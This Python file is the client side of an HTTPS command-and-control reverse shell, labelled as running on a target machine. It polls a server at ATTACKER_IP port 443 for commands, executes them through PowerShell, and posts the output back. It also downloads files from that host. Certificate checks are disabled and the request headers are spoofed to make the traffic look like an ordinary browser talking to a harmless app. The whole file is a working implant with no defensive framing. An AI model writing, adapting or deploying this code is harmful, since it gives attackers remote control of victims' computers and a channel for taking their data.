#Client ---> runs on target

from urllib import request, parse
import subprocess
import os
import time,random;
import ssl
import re
import sys
import json

coco = os.getcwd()
wait = 0.6
teta = 0.3
ATTACKER_IP = '127.0.0.1' # change this to the attacker's IP address
ATTACKER_PORT = 443
HEADERS = {
    'Host': 'api.johndutton.app',
    'Sec-Ch-Ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
    'Accept': 'application/json, text/plain, */*',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Origin': 'https://johndutton.app',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://johndutton.app/',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
}

# Data is a dict
def send_post(data, url=f'https://{ATTACKER_IP}:{ATTACKER_PORT}'):
    global HEADERS
    global wdir
    data = {"rfile": data, "wdir": wdir}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data, headers=HEADERS)
    request.urlopen(req, context=ssl.SSLContext()) # send request

def run_command(data):
    command = data["command"]
    wdir = data["wdir"]
    #Handle the download command
    if(command.startswith("download")):
        regex = re.search(r'download "([^"]*)" "([^"]*)"', command, re.IGNORECASE)
        if(regex != None):
            src = regex.group(1)
            dst = regex.group(2)
            send_post("Fichier en cours d'upload...")
            ssl._create_default_https_context = ssl._create_unverified_context
            try:
                request.urlretrieve(f"https://{ATTACKER_IP}:{ATTACKER_PORT}/"+src, dst)
            except Exception as e:
                send_post(str(e))
            send_post("Fichier upload à : "+dst)
        else:
            send_post("Utilisation : download \"<filename>\" \"<destination>\"")
    #Handle cmd.exe commands
    else:
        CMD = subprocess.Popen("powershell "+command, cwd=wdir, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        send_post(CMD.stdout.read())
        send_post(CMD.stderr.read())

while True:

    req = request.Request(f"https://{ATTACKER_IP}:{ATTACKER_PORT}", headers=HEADERS)
    data = json.loads(request.urlopen(req, context=ssl.SSLContext()).read().decode())
    command = data["command"]
    if(data["wdir"] == "/"):
        data["wdir"] = os.getcwd()
    wdir = data["wdir"]

    if command.startswith('exit'):
        send_post("CLIENT EXITED SILENTLY, YOU CAN Ctrl+C TO END.")
        sys.exit()
    if command.startswith('cd '):
        CMD = subprocess.Popen(command.replace("cd ", "powershell Resolve-Path "), cwd=wdir, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        wdir = list(filter(None, re.split(r"[\r|\n]",CMD.stdout.read().decode())))[-1]
        send_post(CMD.stdout.read())
        send_post(CMD.stderr.read())
    else:
        time.sleep(random.uniform(wait-teta, wait+teta))
        run_command(data)
        time.sleep(random.uniform(wait-teta, wait+teta))